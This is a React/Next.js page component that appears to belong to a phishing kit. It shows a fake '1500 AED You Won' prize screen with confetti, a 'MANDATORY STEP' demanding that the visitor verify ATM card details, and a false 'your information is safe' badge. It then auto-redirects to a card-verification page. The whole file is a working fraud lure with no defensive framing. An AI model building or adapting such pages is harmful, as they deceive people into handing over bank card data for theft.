'use client'

import { useRouter } from 'next/navigation'
import { useEffect, useState } from 'react'
import { AlertTriangle, Check, ShieldCheck } from 'lucide-react'

const confetti = [
  'left-6 top-20 h-1 w-3 rotate-12',
  'left-12 top-24 h-2 w-2 rotate-12',
  'left-20 top-14 h-1.5 w-1.5',
  'left-28 top-28 h-2 w-2 -rotate-12',
  'right-16 top-14 h-2 w-2 rotate-12',
  'right-24 top-28 h-1 w-3 rotate-12',
  'right-10 top-20 h-1 w-3 rotate-6',
]

export default function CongratulationsPage() {
  const [showTick, setShowTick] = useState(false)
  const router = useRouter()

  useEffect(() => {
    const tickTimer = window.setTimeout(() => setShowTick(true), 900)
    const navigationTimer = window.setTimeout(() => router.push('/card-verification'), 3000)
    return () => {
      window.clearTimeout(tickTimer)
      window.clearTimeout(navigationTimer)
    }
  }, [router])

  return (
    <main className="relative min-h-screen overflow-hidden bg-[#effcf5] px-7 pt-44 text-center">
      <div aria-hidden="true" className="pointer-events-none absolute inset-0">
        {confetti.map((item, index) => (
          <span
            key={index}
            className={`absolute rounded-sm ${item} ${index % 3 === 0 ? 'bg-[#22c568]' : index % 3 === 1 ? 'bg-[#ffc31c]' : 'bg-[#36bf72]'}`}
          />
        ))}
      </div>

      <section className="relative mx-auto w-full max-w-sm rounded-3xl bg-white px-7 pb-7 pt-16 shadow-[0_8px_28px_rgba(27,164,83,0.12)]">
        <div
          aria-label={showTick ? 'Success' : 'Processing'}
          className={`absolute -top-8 left-1/2 flex h-20 w-20 -translate-x-1/2 items-center justify-center rounded-full border-4 border-white bg-[#22c568] shadow-[0_8px_24px_rgba(34,197,104,0.35)] ${showTick ? '' : 'animate-[spin_900ms_ease-in-out]'}`}
        >
          {showTick ? (
            <Check className="h-11 w-11 animate-[scale-in_250ms_ease-out] text-white" strokeWidth={3} />
          ) : (
            <span className="h-9 w-9 rounded-full border-4 border-white/35 border-t-white" />
          )}
        </div>

        <h1 className="font-serif text-3xl font-bold italic text-[#159d4a]">
          Congratulations!
        </h1>
        <div className="mt-5 flex items-center justify-center gap-3 text-[#18ae54]">
          <span className="h-px w-24 bg-border" />
          <span className="text-sm">★</span>
          <span className="h-px w-24 bg-border" />
        </div>
        <p className="mt-3 text-[52px] font-bold leading-none tracking-tight text-[#159d4a]">
          1500 AED
        </p>
        <p className="mt-2 text-base font-bold text-slate-800">You Won</p>

        <div className="mx-auto mt-5 inline-flex items-center gap-2 rounded-full border border-orange-200 bg-orange-50 px-5 py-2 text-xs font-bold tracking-wide text-orange-600">
          <AlertTriangle className="h-4 w-4 fill-yellow-300 text-black" />
          MANDATORY STEP
        </div>
        <p className="mt-4 text-sm leading-6 text-slate-600">
          You must verify your ATM Card details
          <br />
          to receive your reward within <strong className="text-[#159d4a]">4–24</strong>
          <br />
          <strong className="text-[#159d4a]">hours</strong>
        </p>

        <div className="mt-6 flex items-center gap-3 rounded-2xl bg-[#16a64e] px-5 py-4 text-left text-white">
          <div className="flex h-10 w-10 shrink-0 items-center justify-center rounded-full bg-white/15">
            <ShieldCheck className="h-5 w-5" />
          </div>
          <div>
            <p className="text-base font-bold">Secure Verification</p>
            <p className="text-[11px] leading-4 text-white/90">
              Your information is safe with us and
              <br />
              will remain confidential.
            </p>
          </div>
        </div>
      </section>
    </main>
  )
}
